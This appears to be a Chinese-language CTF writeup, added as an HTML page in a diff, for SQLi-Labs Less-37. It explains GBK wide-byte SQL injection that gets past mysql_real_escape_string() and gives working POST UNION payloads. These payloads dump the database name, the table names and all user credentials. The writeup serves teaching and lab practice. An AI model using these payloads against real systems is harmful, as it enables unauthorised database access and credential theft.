@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-37 POST型宽字节与 Real Escape 绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-37 POST型宽字节与 Real Escape 绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 宽字节注入, POST注入, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-37 (POST - Bypass MySQL Real Escape String)</li>
+        <li><strong>提示：</strong>POST 登录框，后端使用 <code>mysql_real_escape_string()</code> 转义，字符集为 GBK。</li>
+    </ul>
+
+    <h2>2. 工具配置与操作环境</h2>
+    <p>本关卡为 POST 请求，需拦截并修改 HTTP 请求体，使用 <b>Burp Suite</b> 的 Repeater 模块进行调试。</p>
+
+    <h2>3. 核心原理：防御失效与宽字节逃逸</h2>
+    <p>本关卡与 Less-36 原理一致，是 Less-34 与 Less-36 的综合体。后端使用了 <code>mysql_real_escape_string()</code> 函数进行转义。理论上，该函数会检查当前连接字符集，能防御宽字节注入。</p>
+    <p><strong>漏洞成因：</strong></p>
+    <ol>
+        <li>开发者使用了 <code>mysql_query("SET NAMES gbk")</code> 而不是 <code>mysql_set_charset('gbk')</code> 来设置字符集。</li>
+        <li>这导致 <code>mysql_real_escape_string()</code> 在转义时误以为环境是默认字符集（如 ASCII），于是将单引号 <code>'</code>（<code>0x27</code>）转义为 <code>\'</code>（<code>0x5C 0x27</code>）。</li>
+        <li>在 <code>uname</code> 传入 <code>-1%df'</code> 时，底层字节流为 <code>2D 31 DF 5C 27</code>。MySQL 引擎按 GBK 编码解析，将 <code>0xDF 0x5C</code> 组合为汉字，导致单引号 <code>0x27</code> 逃逸，成功闭合语句。</li>
+    </ol>
+
+    <h2>4. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：抓包与探测</strong></p>
+    <p>在登录框随意输入账号密码，抓取 POST 请求并发送至 Repeater。登录框查询语句为 <code>SELECT username, password FROM users ...</code>，固定为 <b>2 列</b>。</p>
+
+    <p><strong>第二步：联合查询爆库名</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,database()-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面返回 <code>Your Login name:1</code>，<code>Your Password:security</code>。</p>
+
+    <p><strong>第三步：爆表名</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong><code>Your Password:emails,referrers,uagents,users</code>。</p>
+
+    <p><strong>第四步：直接脱库</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,group_concat(username,0x3a,password) from users-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面在 Password 处打印出所有用户的明文账号密码，如 <code>Dumb:Dumb,Angelina:I-kill-you...</code>。</p>
+
+    <h2>5. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>编码陷阱</strong>：在 Burp 的 Raw 面板直接发送 <code>%df</code> 原始字节，严禁二次 URL 编码。</li>
+        <li><strong>列数严格匹配</strong>：原查询固定 2 列，UNION SELECT 必须凑齐 2 列，否则报错。</li>
+        <li><strong>注释符</strong>：POST 环境中，<code>-- -</code>（注意末尾空格）或 <code>#</code> 均可有效截断原语句尾部。</li>
+    </ul>
+
+    <h2>6. 知识点总结</h2>
+    <ul>
+        <li><strong>POST 宽字节注入</strong>：结合抓包工具，在请求体中注入高位字节绕过转义。</li>
+        <li><strong>环境错位漏洞</strong>：<code>SET NAMES</code> 与 <code>mysql_set_charset</code> 的区别导致的高级防御函数失效。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
